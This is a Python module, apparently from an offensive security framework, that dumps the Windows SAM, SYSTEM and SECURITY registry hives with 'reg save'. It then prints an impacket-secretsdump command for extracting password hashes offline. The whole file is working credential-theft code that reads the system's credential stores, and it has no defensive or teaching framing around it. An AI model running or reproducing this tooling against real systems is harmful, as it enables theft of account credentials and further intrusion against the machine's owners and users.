import os
import sys
import subprocess
from core.base_module import BaseModule
from rich.console import Console

class SamDump(BaseModule):
    """Dumps SAM, SYSTEM, and SECURITY hives from a Windows target."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'OUTPUT_DIR': ['.', 'The directory to save the hive files to.'],
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def run(self, options):
        """
        Executes the hive dump.
        """
        output_dir = options.get('OUTPUT_DIR')
        console = Console()

        if not sys.platform == 'win32':
            console.print("[!] This module is only for Windows systems.", style="bold red")
            return

        console.print("[*] Attempting to dump SAM, SYSTEM, and SECURITY hives...")
        console.print("[yellow][!] This operation requires Administrator privileges.[/yellow]")

        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        hives = {
            'sam': os.path.join(output_dir, 'sam.save'),
            'system': os.path.join(output_dir, 'system.save'),
            'security': os.path.join(output_dir, 'security.save')
        }

        success = True
        for hive_name, save_path in hives.items():
            command = ['reg', 'save', f'hklm\\{hive_name}', save_path, '/y']
            try:
                proc = subprocess.run(command, capture_output=True, text=True, check=True, shell=True)
                console.print(f"[bold green][+] Successfully dumped {hive_name.upper()} hive to {save_path}[/bold green]")
            except subprocess.CalledProcessError as e:
                console.print(f"[!] Failed to dump {hive_name.upper()} hive.", style="bold red")
                console.print(f"  -> Return Code: {e.returncode}")
                if 'Access is denied' in e.stderr:
                    console.print("  -> Error: Access is denied. Please run as Administrator.")
                else:
                    console.print(f"  -> Stderr: {e.stderr.strip()}")
                success = False
            except FileNotFoundError:
                console.print("[!] `reg.exe` not found. Is this a standard Windows environment?", style="bold red")
                success = False
                break

        if success:
            console.print("\\n[*] Dump complete. Use a tool like `impacket-secretsdump` to extract hashes offline:")
            console.print(f"  [cyan]impacket-secretsdump -sam {hives['sam']} -system {hives['system']} -security {hives['security']} LOCAL[/cyan]")
        else:
            console.print("\\n[*] Dump failed. Ensure you are running with sufficient privileges.")